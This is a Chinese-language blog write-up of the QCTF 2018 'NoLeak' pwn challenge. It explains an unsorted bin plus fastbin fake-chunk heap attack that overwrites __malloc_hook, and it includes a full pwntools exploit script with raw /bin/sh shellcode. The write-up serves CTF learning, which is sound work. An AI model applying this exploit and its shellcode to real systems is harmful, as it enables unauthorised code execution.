---
title: QCTF 2018 NoLeak
date: 2018-07-27 08:37:40
tags: [CTF, PWN]
categories: PWN练习
---
# QCTF 2018

## NoLeak wp

​	这道题是一道unsorted bin attack + fastbin attck的题。
	拿到题扔ida一看发现无printf函数无法泄露地址，所以就无法构造system指令执行，checksec看下发现未开nx保护，此时基本可以确定是写shellcode(堆题写shellcode之前没做过)。
	<!--more-->
审下函数发现edit函数检查不全面导致可以修改已经free的chunk的两个指针fd和bk，这里可以利用		unsorted bin的特性，修改free后的unsorted bin中的chunk的fd和bk，使修改的target地址指向unsortedbin中的链表头，由于其载入内存的基地址是一样的，且libc后三个字节是固定的，所以可以通过libc-database识别libc版本并得到函数的offset（题目给了libc库），然后修改target指向的链表头地址的后三个字节，使其指向想要覆盖的got表地址。但是单靠unsortedbin无法直接进行任意地址读写，这里还需要用到fastbin attack（unsorted bin这里可以理解为起到了leak的作用) 构造fake chunk进行任意地址写。

​	攻击者可以通过修改fastbin中freechunk的fd，使其指向一个fake chunk，然后进行一次malloc，第二次malloc就能在指定位置创建chunk了，也就是可以向指定地址写数据。这里需要注意的是当malloc fake chunk的时候 ，*(&(fake chunk)+8) 也就是fake chunk的size大小必须要属于fastbin对应的大小，否则在进行分配的时候glibc会报错。当成功malloc fake chunk后，我们已经能够向指定位置写入数据，这里我们向bss段保存chunk user data段指针的buff写入包含buff自身地址信息的数据，这样利用程序中的update函数我们就能向bss段写入shellcode，然后我们就可以通过覆写got表(__malloc_hook)为指向shellcode的地址来最终get shell。
exp如下:

```
from pwn import *

context(log_level='debug',arch='amd64',os='linux')

p=process('./NoLeak')

def create(size,data):

	p.recvuntil('Your choice :')

	p.sendline('1')

	p.recvuntil('Size: ')

	p.sendline(str(size))

	p.recvuntil('Data: ')

	p.sendline(str(data))

def delete(index):

	p.recvuntil('Your choice :')

	p.sendline('2')

	p.recvuntil('Index: ')

	p.sendline(str(index))

def update(index,size,data):

	p.recvuntil('Your choice :')

	p.sendline('3')

	p.recvuntil('Index: ')

	p.sendline(str(index))

	p.recvuntil('Size: ')

	p.sendline(str(size))

	p.recvuntil('Data: ')

	p.sendline(str(data))

def exit():

	p.recvuntil('Your choice :')

	p.sendline('4')

magic=0x0000000000601040

shellcode=asm(shellcraft.sh())

shellcode='\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'

create(0x60,'0000')

create(0x80,'1111') 

create(0x80,'2222') 

delete(1)

update(1,0x10,p64(magic+0x20)*2)

create(0x80,'3333')

delete(0)

update(0,0x8,p64(0x60106d))

create(0x60,'3333')

create(0x60,'aaa'+p64(0x601070)+p64(0x601080))

update(8,1,p64(0x10))

update(6,8,p64(0x601080))

update(9,len(shellcode),shellcode)

p.interactive()
```



​	总结一下这题思路其实很明确，ida中看到没开泄露地址的函数加上nx保护没开所以想到写shellcode，然后想到got表覆写，由于不能直接泄露地址想到可以利用unsorted bin的链表头指针间接泄露基址，找到libc版本库确定要覆盖函数的低三字节，利用fastbin fake chunk attack向堆指针buff区写入一个包含buff自身信息的指针，然后就能向低三字节写入查找到的地址，之后利用update函数在bss段buff区后面写入shellcode，最后再利用update函数向got表写入指向shellcode的指针，当调用malloc函数时由于malloc-hook已经被覆盖，所以能直接跳去执行shellcode。